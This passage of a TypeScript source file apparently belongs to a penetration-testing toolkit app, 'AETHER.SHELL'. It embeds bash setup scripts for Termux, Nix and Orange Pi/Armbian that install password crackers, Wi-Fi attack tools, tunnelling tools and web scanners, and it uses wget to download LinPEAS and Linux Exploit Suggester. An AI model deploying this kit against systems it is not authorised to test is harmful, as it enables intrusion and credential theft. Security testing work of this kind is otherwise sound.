echo "[*] Installing Linux Exploit Suggester..."
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /opt/linux-exploit-suggester.sh
chmod +x /opt/linux-exploit-suggester.sh

echo "[+] AETHER.SHELL setup complete! Tools installed."
`
  },
  {
    name: 'Termux Setup',
    description: 'Install tools on Android via Termux',
    environment: 'termux',
    script: `#!/bin/bash
# AETHER.SHELL - Termux (Android) Setup
echo "[*] AETHER.SHELL - Termux Installation"
pkg update && pkg upgrade -y

echo "[*] Installing core packages..."
pkg install -y nmap hydra john hashcat python git wget curl openssh \\
  netcat-openbsd socat binwalk radare2 gdb strace ltrace \\
  openssl proxychains-ng \\
  dnsrecon dnsenum whois wafw00f gobuster ffuf dirb nikto sqlmap \\
  aircrack-ng hashid crunch macchanger fail2ban-uinput

echo "[*] Installing Python tools..."
pip install sherlock-project wafw00f nuclei httpx-toolkit subfinder \\
  amass theharvester dalfox arjun secretfinder paramspider medusa \\
  hashid pycryptodome stegano

echo "[*] Installing Go tools..."
GOBIN=$PREFIX/bin go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest \\
  github.com/projectdiscovery/httpx/cmd/httpx@latest \\
  github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest \\
  github.com/ffuf/ffuf/v2@latest \\
  github.com/hahwul/dalfox/v2@latest \\
  github.com/tomnomnom/waybackurls@latest \\
  github.com/jpillora/chisel@latest \\
  github.com/hakluke/hakrawler@latest 2>/dev/null

echo "[+] AETHER.SHELL Termux setup complete!"
echo "[!] Note: Some tools require root access. Use 'tsu' for root shell."
`
  },
  {
    name: 'Nix/NixOS Setup',
    description: 'Install tools via Nix package manager',
    environment: 'nix',
    script: `#!/bin/bash
# AETHER.SHELL - Nix Package Manager Setup
echo "[*] AETHER.SHELL - Nix Installation"

echo "[*] Installing security tools via nix..."
nix-env -iA nixpkgs.nmap nixpkgs.nikto nixpkgs.sqlmap nixpkgs.hydra nixpkgs.john \\
  nixpkgs.hashcat nixpkgs.aircrack-ng nixpkgs.wireshark nixpkgs.tshark \\
  nixpkgs.tcpdump nixpkgs.netcat nixpkgs.socat nixpkgs.binwalk \\
  nixpkgs.radare2 nixpkgs.ghidra nixpkgs.gdb nixpkgs.strace \\
  nixpkgs.lynis nixpkgs.chkrootkit nixpkgs.openssl nixpkgs.steghide \\
  nixpkgs.impacket nixpkgs.burpsuite nixpkgs.ettercap nixpkgs.responder \\
  nixpkgs.sleuthkit nixpkgs.foremost nixpkgs.volatility3 \\
  nixpkgs.ripgrep nixpkgs.gobuster nixpkgs.ffuf nixpkgs.subfinder \\
  nixpkgs.masscan nixpkgs.bettercap nixpkgs.dnsrecon nixpkgs.wafw00f \\
  nixpkgs.whois nixpkgs.nuclei nixpkgs.httpx nixpkgs.dnscrypt-wrapper \\
  nixpkgs.proxychains nixpkgs.proxychains-ng nixpkgs.sshuttle \\
  nixpkgs.zstd nixpkgs.p7zip nixpkgs.testssl nixpkgs.hashid 2>/dev/null

echo "[+] AETHER.SHELL Nix setup complete!"
`
  },
  {
    name: 'Orange Pi / Armbian Setup',
    description: 'Optimized setup for Orange Pi Zero LTS running Armbian',
    environment: 'armbian',
    script: `#!/bin/bash
# AETHER.SHELL - Orange Pi Zero LTS (Armbian) Setup
echo "[*] AETHER.SHELL - Orange Pi Zero LTS Setup"
echo "[*] Target: ARM Cortex-A53, 1GB RAM, Armbian Debian"

echo "[*] System optimization..."
sudo apt update && sudo apt upgrade -y
# Reduce memory usage
sudo systemctl disable bluetooth 2>/dev/null
sudo systemctl disable avahi-daemon 2>/dev/null

echo "[*] Installing ARM-compatible tools..."
sudo apt install -y nmap masscan nikto sqlmap hydra john hashcat \\
  aircrack-ng wifite reaver pixiewps hcxtools hcxdumptool macchanger \\
  tshark tcpdump netcat-openbsd socat \\
  binwalk radare2 gdb strace ltrace objdump readelf \\
  lynis chkrootkit rkhunter fail2ban ufw \\
  openssl steghide stegseek \\
  crackmapexec impacket-scripts searchsploit exploitdb \\
  proxychains4 sshuttle netdiscover \\
  gobuster ffuf feroxbuster dirb nuclei wpscan \\
  whatweb wafw00f dnsenum dnsrecon enum4linux \\
  dsniff responder ettercap \\
  hashid crunch cewl \\
  sleuth-kit foremost scalpel bulk_extractor \\
  strings volatility3 python3 python3-pip \\
  git wget curl gcc g++ make build-essential

echo "[*] Installing Python tools (ARM)..."
pip3 install --break-system-packages sherlock-project wafw00f arjun \\
  secretfinder nuclei dalfox paramspider medusa hashid \\
  pycryptodome requests scapy

echo "[*] Building Go tools from source (ARM64)..."
export GOARCH=arm64
export GOOS=linux
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest \\
  github.com/projectdiscovery/httpx/cmd/httpx@latest \\
  github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest \\
  github.com/ffuf/ffuf/v2@latest \\
  github.com/hakluke/hakrawler@latest \\
  github.com/jpillora/chisel@latest 2>/dev/null

echo "[*] Setting up USB WiFi adapter support..."
sudo apt install -y firmware-atheros firmware-realtek firmware-ralink 2>/dev/null

echo "[*] Creating Aether directories..."
sudo mkdir -p /opt/aether/{scripts,results,logs,wordlists}

echo "[*] Downloading LinPEAS..."
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /opt/aether/scripts/linpeas.sh
chmod +x /opt/aether/scripts/linpeas.sh

echo "[+] AETHER.SHELL Orange Pi setup complete!"
echo "[!] Note: WiFi monitoring requires compatible USB adapter."
echo "[!] Recommended: Alfa AWUS036ACH or Panda PAU09"
`
  }
];

// Termux-compatible tools (subset that works on Android)
export const TERMUX_TOOLS = TOOLS_DATABASE.filter(t =>
  t.command && !['aircrack-ng', 'bettercap', 'wifite', 'reaver', 'airgeddon', 'ettercap', 'wireshark', 'openvas', 'ghidra', 'gdb'].includes(t.command)
);

// Tools that work offline (no internet required)
export const OFFLINE_TOOLS = TOOLS_DATABASE.filter(t => t.offline);

// Get tools by category
export function getToolsByCategory(category: ToolCategory): HackTool[] {
  return TOOLS_DATABASE.filter(t => t.category === category);
}

// Search tools by name, description, or tags
export function searchTools(query: string): HackTool[] {
  const lower = query.toLowerCase();
  return TOOLS_DATABASE.filter(t =>
    t.name.toLowerCase().includes(lower) ||
    t.description.toLowerCase().includes(lower) ||
    t.tags?.some(tag => tag.includes(lower)) ||
    t.category.includes(lower)
  );
}

// Get tools by source
export function getToolsBySource(source: string): HackTool[] {
  return TOOLS_DATABASE.filter(t => t.source === source);
}
